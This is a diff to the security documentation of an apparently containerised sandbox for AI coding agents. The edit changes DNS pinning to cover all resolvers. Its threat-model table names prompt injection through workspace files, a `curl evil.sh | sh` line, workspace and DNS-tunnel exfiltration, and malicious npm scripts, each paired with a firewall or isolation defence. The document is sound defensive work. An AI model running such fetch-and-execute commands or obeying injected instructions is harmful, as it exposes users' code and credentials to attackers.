@@ -191,7 +191,7 @@ A maliciously crafted file in the workspace (e.g. a prompt-injection in a README
 When the firewall is enabled (default), `init-firewall.sh` runs as root inside the container and:
 
 - Sets `iptables` and `ip6tables` policies to DROP.
-- Pins DNS to the first resolver listed in `/etc/resolv.conf` (closes the DNS-tunnel exfiltration gap in the upstream Anthropic devcontainer).
+- Pins DNS to all resolvers listed in `/etc/resolv.conf` (closes the DNS-tunnel exfiltration gap in the upstream Anthropic devcontainer).
 - Allows GitHub's published IP ranges (fetched from `api.github.com/meta`), `registry.npmjs.org`, Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`, `code.claude.com`, `platform.claude.com`), `api.openai.com`, `auth.openai.com`, and `chatgpt.com`.
 - In the devcontainer firewall variant only, allows the host gateway subnet so port-forwarding and IDE attach work. Direct CLI runs omit this host-network allowlist.
 - Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable — the script exits with an error if both `ip6tables` and `sysctl` are unavailable.
@@ -213,7 +213,7 @@ Customize:
 | Agent reads `~/.ssh`, `~/Library`, etc. | Arbitrary host home directories are not mounted by default. Apple `container` adds a VM boundary; Docker/Podman rely on the host's container isolation. |
 | Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable container or VM. |
 | Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
-| DNS tunneling exfiltration | DNS restricted to the container resolver only. |
+| DNS tunneling exfiltration | DNS restricted to the container resolver(s) only. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as UID 1000 inside the container; no access to unmounted host paths. |
 | Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). |
